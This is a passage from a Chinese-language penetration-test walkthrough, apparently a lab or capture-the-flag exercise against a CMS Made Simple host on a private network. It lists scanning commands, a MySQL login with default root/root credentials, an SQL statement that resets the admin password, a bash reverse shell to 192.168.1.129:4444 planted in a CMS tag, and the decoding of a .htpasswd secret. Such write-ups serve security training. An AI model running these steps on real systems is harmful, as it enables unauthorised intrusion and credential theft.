nmap -A -sS -sV -v -p- 192.168.1.8

3、WEB渗透测试

3.1 通过nikto扫描测试，发现有phpinfo页面和后台登录页面

nikto -host http://192.168.1.8

3.2 测试访问数据库，使用账号root，密码root登录成功，存在弱口令

mysql -h 192.168.1.8 -uroot -proot

3.3 查看数据库信息

show databases;use cmsms_db;

3.4 查看表信息

show tables;

3.5 查看表内容

select * from cms_users;

3.6 修改admin用户的密码为admin123

update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'admin123'))) where username = 'admin';

3.7 登录前段页面，使用账号admin,密码admin123

3.8 写入反弹shell

system("bash -c 'bash -i >& /dev/tcp/192.168.1.129/4444 0>&1'");

3.9 kali开启反弹shell，并访问页面

nc -nlvp 4444

访问反弹shell页面

http://192.168.1.8/index.php?page=user-defined-tags

获取反弹shell

3.10 进入admin目录，获取隐藏密码文件

ls -lahcd adminls -lah

查看隐藏文件，得到一串密码文件

cat .htpasswd

3.11 使用base64进行解码

echo TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0= | base64 -d

二次使用base64解码不成功，使用base32解码，得到用户名和密码

Base64和Base32 区别：

base64中包含大写字母（A-Z），小写字母（a-z），数字0—9以及+/；

base32中只包含大写字母（A-Z）和数字234567
